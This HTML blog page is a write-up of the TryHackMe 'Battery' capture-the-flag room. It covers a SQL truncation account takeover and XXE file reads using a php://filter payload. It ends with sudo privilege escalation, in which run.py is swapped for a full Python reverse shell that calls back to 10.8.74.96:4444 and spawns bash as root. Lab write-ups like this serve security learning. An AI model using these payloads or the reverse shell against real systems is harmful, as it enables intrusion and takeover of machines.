@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Writeup of TryHackMe Battery room">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Battery TryHackMe Writeup"/>
+<meta name="twitter:description" content="Writeup of TryHackMe Battery room"/>
+
+    <meta property="og:title" content="Battery TryHackMe Writeup" />
+<meta property="og:description" content="Writeup of TryHackMe Battery room" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/" />
+<meta property="article:published_time" content="2021-01-19T00:29:35+05:30" />
+<meta property="article:modified_time" content="2021-01-19T00:29:35+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/overpass3/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chill_hack/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/unbaked_pie/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/all_in_one/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/c0lddbox/" />
+
+
+
+    <title>
+  Battery TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Battery TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-01-19T00:29:35&#43;05:30'>
+                January 19, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/tryhackme/">tryhackme</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="batteryhttpstryhackmecomroombattery-tryhackme-writeup"><a href="https://tryhackme.com/room/battery">Battery</a> TryHackMe Writeup</h1>
+<p><img src="/TryHackMe/Battery/BoxImage.png" alt=""></p>
+<h2 id="first-stage--enumeration">First Stage : Enumeration.</h2>
+<h3 id="note--this-is-one-of-the-ways-to-do-this-room-try-your-own-way-and-root-it-">Note : this is one of the ways to do this room. Try your own way and root it !</h3>
+<p>Let&rsquo;s start with nmap</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Sat Jan 16 14:40:15 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.132.103
+Nmap scan report for 10.10.132.103
+Host is up, received conn-refused (0.15s latency).
+Scanned at 2021-01-16 14:40:16 IST for 741s
+Not shown: 65533 closed ports
+Reason: 65533 conn-refused
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAPe2PVDHBBlUCEtHNVxjToY/muZpZ4hrISDM7fuGOkh/Lp9gAwpEh24Y/u197WBDTihDJsDZJqrJEJSWbpiZgReyh1LtJTt3ag8GrUUDJCNx6lLUIWR5iukdpF7A2EvV4gFn7PqbmJmeeQRtB+vZJSp6VcjEG0wYOcRw2Z6N6ho3AAAAFQCg45+RiUGvOP0QLD6PPtrMfuzdQQAAAIEAxCPXZB4BiX72mJkKcVJPkqBkL3t+KkkbDCtICWi3d88rOqPAD3yRTKEsASHqSYfs6PrKBd50tVYgeL+ss9bP8liojOI7nP0WQzY2Zz+lfPa+d0uzGPcUk0Wg3EyLLrZXipUg0zhPjcXtxW9+/H1YlnIFoz8i/WWJCVaUTIR3JOoAAACBAMJ7OenvwoThUw9ynqpSoTPKYzYlM6OozdgU9d7R4XXgFXXLXrlL0Fb+w7TT4PwCQO1xJcWp5xJHi9QmXnkTvi386RQJRJyI9l5kM3E2TRWCpMMQVHya5L6PfWKf08RYGp0r3QkQKsG1WlvMxzLCRsnaVBqCLasgcabxY7w6e2EM
+|   2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkDLTds2sLmn9AZ0KAl70Fu5gfx5T6MDJehrsCzWR3nIVczHLHFVP+jXDzCcB075jjXbb+6IYFOdJiqgnv6SFxk85kttdvGs/dnmJ9/btJMgqJI0agbWvMYlXrOSN26Db3ziUGrddEjTT74Z1kokg8d7uzutsfZjxxCn0q75NDfDpNNMLlstOEfMX/HtOUaLQ47IeuSpaQoUkNkHF2SGoTTpbC+avzcCNHRIZEwQ6HdA3vz1OY6TnpAk8Gu6st9XoDGblGt7xv1vyt0qUdIYaKib8ZJQyj1vb+SJx6dCljix4yDX+hbtyKn08/tRfNeRhVSIIymOTxSGzBru2mUiO5
+|   256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCYHRWUDqeSQgon8sLFyvLMQygCx01yXZR6kxiT/DnZU+3x6QmTUir0HaiwM/n3aAV7eGigds0GPBEVpmnw6iu4=
+|   256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILW7vyhbG1WLLhSEDM0dPxFisUrf7jXiYWNSTqw6Exri
+80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan 16 14:52:37 2021 -- 1 IP address (1 host up) scanned in 742.27 seconds
+</code></pre></div><p>So the ports that are open are</p>
+<ul>
+<li>22</li>
+<li>80</li>
+</ul>
+<p>Since only port 80 seems the possible way in , let&rsquo;s fire up gobuster.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.132.103/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt,html
+[+] Timeout:        10s
+===============================================================
+2021/01/16 14:44:34 Starting gobuster
+===============================================================
+/register.php (Status: 200)
+/index.html (Status: 200)
+/admin.php (Status: 200)
+/scripts (Status: 301)
+/forms.php (Status: 200)
+/report (Status: 200)
+/logout.php (Status: 302)
+/dashboard.php (Status: 302)
+/acc.php (Status: 200)
+/with.php (Status: 302)
+/tra.php (Status: 302)
+/server-status (Status: 403)
+===============================================================
+2021/01/16 15:30:28 Finished
+===============================================================
+</code></pre></div><p>So we can see admin.php</p>
+<p>I tried every common passwords but didnt work.</p>
+<p>When I went to report I downloaded a file , I didnt give it any attention . So I tried sql injection using sqlmap and manually also but nothing worked.</p>
+<p>So I saw what is the source code of the page , in there I found an interesting thing.</p>
+<p><img src="/TryHackMe/Battery/adminphp.png" alt=""></p>
+<p><img src="/TryHackMe/Battery/registerphp.png" alt=""></p>
+<p>If you observer the differences between both the source code u can see the maxlength &ldquo;12&rdquo; and &ldquo;14&rdquo; difference there.</p>
+<p>This is a type of sql vulnerability called <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">SQL Truncation</a> (click the link to give a read)</p>
+<p>But we need to find username and the username is not admin.</p>
+<p>A friend of mine gave me an hint to look at the file I found in <strong>/report</strong> directory.</p>
+<p><img src="/TryHackMe/Battery/reportfile.png" alt=""></p>
+<p>So it is an elf executable file.</p>
+<p>Hence I ran the binary.</p>
+<p><img src="/TryHackMe/Battery/testbinary.png" alt=""></p>
+<p>Interesting , so I fired up ghidra in hope of finding credentials.</p>
+<p>So the main function is:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">undefined8 main(void)
+
+{
+  int iVar1;
+  int local_8c;
+  char local_88 [32];
+  char local_68 [32];
+  undefined local_48 [32];
+  char local_28 [32];
+  
+  local_8c = 0;
+  puts(&#34;\n\n\n&#34;);
+  puts(&#34;Welcome To ABC DEF Bank Managemet System!\n\n&#34;);
+  printf(&#34;UserName : &#34;);
+  __isoc99_scanf(&amp;DAT_001021f0,local_68);
+  puts(&#34;\n&#34;);
+  printf(&#34;Password : &#34;);
+  __isoc99_scanf(&amp;DAT_001021f0,local_88);
+  iVar1 = strcmp(local_68,&#34;guest&#34;);
+  if ((iVar1 == 0) &amp;&amp; (iVar1 = strcmp(local_88,&#34;&lt;redacted-password&gt;&#34;), iVar1 == 0)) {
+    options();
+    while (local_8c != 5) {
+      printf(&#34;Your Choice : &#34;);
+      __isoc99_scanf(&amp;DAT_00102216,&amp;local_8c);
+      if (local_8c == 1) {
+        users();
+      }
+      else {
+        if (local_8c == 4) {
+          printf(&#34;email : &#34;);
+          __isoc99_scanf(&amp;DAT_001021f0,local_28);
+          puts(&#34;\n&#34;);
+          printf(&#34;Password : &#34;);
+          __isoc99_scanf(&amp;DAT_001021f0,local_48);
+          update(local_28);
+        }
+        else {
+          if ((local_8c == 3) || (local_8c == 2)) {
+            puts(&#34;not available for guest account\n&#34;);
+            system(&#34;clear&#34;);
+            options();
+          }
+          else {
+            puts(&#34;Wrong option\n&#34;);
+            system(&#34;clear&#34;);
+            options();
+          }
+        }
+      }
+    }
+  }
+  else {
+    printf(&#34;Wrong username or password&#34;);
+  }
+  return 0;
+}
+</code></pre></div><p>So from the main function gives creds to <strong>guest</strong> account.</p>
+<p>Let&rsquo;s use it .</p>
+<p><img src="/TryHackMe/Battery/reportguest.png" alt=""></p>
+<p>So we get username <strong>admin&lt;redacted&gt;</strong> hence let&rsquo;s use sql truncate exploit.</p>
+<p>Before we use this exploit we need to know what it does.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In this exploit we are creating a username more than the allowed characters , so that the server will think it is creating a new username but instead we are creating a admin account.
+</code></pre></div><p>Since the register.php allows only 12 characters whereas admin.php allows 14 characters.</p>
+<p>So we need to edit the register.php with inspect element from 12 to 14 as <strong>admin&lt;redacted&gt;   D</strong> which should be exactly 14 characters.</p>
+<p>U can check it with python.</p>
+<p><img src="/TryHackMe/Battery/username.png" alt=""></p>
+<p><img src="/TryHackMe/Battery/before.png" alt=""></p>
+<p><img src="/TryHackMe/Battery/after.png" alt=""></p>
+<p>Now register as this user with ur choice of password.</p>
+<p>Login with <strong>admin&lt;redacted&gt;</strong> and password you found.</p>
+<p>Now you are in as admin.</p>
+<h2 id="__second-stage--from-admin-to-cyber__"><strong>Second Stage : From Admin to cyber</strong></h2>
+<p><img src="/TryHackMe/Battery/beingadmin.png" alt=""></p>
+<p>After this I tried command injection on <strong>acc.php</strong></p>
+<p>Only command which succeeded was &ldquo;whoami&rdquo; . I tried many filters but wont work. I tried other php files and saw something interesting in <strong>forms.php</strong></p>
+<p><img src="/TryHackMe/Battery/formsphp.png" alt=""></p>
+<p>So this gives an hint that we should try <strong>XXE</strong>.</p>
+<p>Hence I found a payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">payload all the things</a>.</p>
+<p>I tried <strong>/etc/passwd</strong></p>
+<p><img src="/TryHackMe/Battery/thepasswd.png" alt=""></p>
+<p>So I tried <strong>expect</strong> but didn&rsquo;t work . There was some filter blocking it. After that I tried to download a shell.php to the machine but the machine deletes that too. After that I tried reading acc.php (hint from a friend)</p>
+<blockquote>
+<p>php://filter/convert.base64-encode/resource=/var/www/html/acc.php</p>
+</blockquote>
+<p><img src="/TryHackMe/Battery/accphpfile.png" alt=""></p>
+<p>So we get base64 encoded reply if we decode it is the file acc.php and it has something <strong>interesting</strong>.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+form
+{
+  border: 2px solid black;
+  outline: #4CAF50 solid 3px;
+  margin: auto;
+  width:180px;
+  padding: 20px;
+  text-align: center;
+}
+
+
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #333;
+}
+
+li {
+  float: left;
+  border-right:1px solid #bbb;
+}
+
+li:last-child {
+  border-right: none;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover:not(.active) {
+  background-color: #111;
+}
+
+.active {
+  background-color: blue;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&#34;dashboard.php&#34;&gt;Dashboard&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;with.php&#34;&gt;Withdraw Money&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;depo.php&#34;&gt;Deposit Money&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;tra.php&#34;&gt;Transfer Money&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;acc.php&#34;&gt;My Account&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;forms.php&#34;&gt;command&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&#34;logout.php&#34;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+  &lt;li style=&#34;float:right&#34;&gt;&lt;a href=&#34;contact.php&#34;&gt;Contact Us&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+
+session_start();
+if(isset($_SESSION[&#39;favcolor&#39;]) and $_SESSION[&#39;favcolor&#39;]===&#34;admin@bank.a&#34;)
+{
+
+echo &#34;&lt;h3 style=&#39;text-align:center;&#39;&gt;Weclome to Account control panel&lt;/h3&gt;&#34;;
+echo &#34;&lt;form method=&#39;POST&#39;&gt;&#34;;
+echo &#34;&lt;input type=&#39;text&#39; placeholder=&#39;Account number&#39; name=&#39;acno&#39;&gt;&#34;;
+echo &#34;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#34;;
+echo &#34;&lt;input type=&#39;text&#39; placeholder=&#39;Message&#39; name=&#39;msg&#39;&gt;&#34;;
+echo &#34;&lt;input type=&#39;submit&#39; value=&#39;Send&#39; name=&#39;btn&#39;&gt;&#34;;
+echo &#34;&lt;/form&gt;&#34;;
+//MY CREDS :- cyber:&lt;redacted-password&gt;
+if(isset($_POST[&#39;btn&#39;]))
+{
+$ms=$_POST[&#39;msg&#39;];
+echo &#34;ms:&#34;.$ms;
+if($ms===&#34;id&#34;)
+{
+system($ms);
+}
+else if($ms===&#34;whoami&#34;)
+{
+system($ms);
+}
+else
+{
+echo &#34;&lt;script&gt;alert(&#39;RCE Detected!&#39;)&lt;/script&gt;&#34;;
+session_destroy();
+unset($_SESSION[&#39;favcolor&#39;]);
+header(&#34;Refresh: 0.1; url=index.html&#34;);
+}
+}
+}
+else
+{
+echo &#34;&lt;script&gt;alert(&#39;Only Admins can access this page!&#39;)&lt;/script&gt;&#34;;
+session_destroy();
+unset($_SESSION[&#39;favcolor&#39;]);
+header(&#34;Refresh: 0.1; url=index.html&#34;);
+}
+?&gt;
+</code></pre></div><p>Hence we get creds for <strong>ssh</strong> , username is cyber.</p>
+<h2 id="__third-stage--cyber-to-root__"><strong>Third Stage : Cyber to root</strong></h2>
+<p>So we ssh into the machine.</p>
+<p><img src="/TryHackMe/Battery/webflag.png" alt=""></p>
+<p>Now we try</p>
+<blockquote>
+<p>sudo -l</p>
+</blockquote>
+<p><img src="/TryHackMe/Battery/permissions.png" alt=""></p>
+<p>If we run the program</p>
+<p><img src="/TryHackMe/Battery/runprogram.png" alt=""></p>
+<p>Since we dont have read and write permission .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cp run.py run.py.bak
+rm run.py
+</code></pre></div><p>Now the reverse shell :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&#34;10.8.74.96&#34;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn(&#34;/bin/bash&#34;)
+</code></pre></div><p>Now we run :</p>
+<blockquote>
+<p>sudo /usr/bin/python3 /home/cyber/run.py</p>
+</blockquote>
+<p>We get shell</p>
+<p><img src="/TryHackMe/Battery/root.png" alt=""></p>
+<p>Now we get the root flag. Since we are root we can also get user <strong>yash</strong> flag.</p>
+<h2 id="__credits__"><strong>Credits:</strong></h2>
+<p>With the hints of <strong><a href="https://tryhackme.com/p/Deepansh11">Deepansh11</a></strong> I completed this room , without those hints I would have been stuck.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/overpass3/">Overpass3 TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chill_hack/">Chill Hack TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/unbaked_pie/">Unbaked Pie TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/all_in_one/">All in One TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/c0lddbox/">ColddBox TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
